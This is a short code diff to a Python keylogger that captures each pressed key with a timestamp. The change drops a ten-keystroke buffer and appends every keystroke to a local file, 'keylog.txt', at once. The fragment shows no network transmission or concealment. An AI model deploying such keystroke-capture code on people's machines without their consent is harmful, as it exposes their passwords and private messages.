@@ -8,7 +8,6 @@ def is_caps_lock_on():
 
 # The file that will contain the log of the keystrokes
 log_file = "keylog.txt"
-keystrokes = []  # A list to store keystrokes
 shift_pressed = False  # A variable to track the shift key state
 
 # This function is called every time a key is pressed
@@ -77,13 +76,11 @@ def log_keystroke(key):
 
     # Timestamp for the keystroke
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    keystrokes.append(f"{timestamp} - {key}")
+    log_entry = f"{timestamp} - {key}\n"
 
-    # Save keystrokes to file every 10 strokes
-    if len(keystrokes) >= 10:
-        with open(log_file, "a") as file:
-            file.write("\n".join(keystrokes) + "\n")
-            keystrokes.clear()
+    # Save keystroke to file immediately
+    with open(log_file, "a") as file:
+        file.write(log_entry)
 
 # This function is called every time a key is released
 def release_key(key):
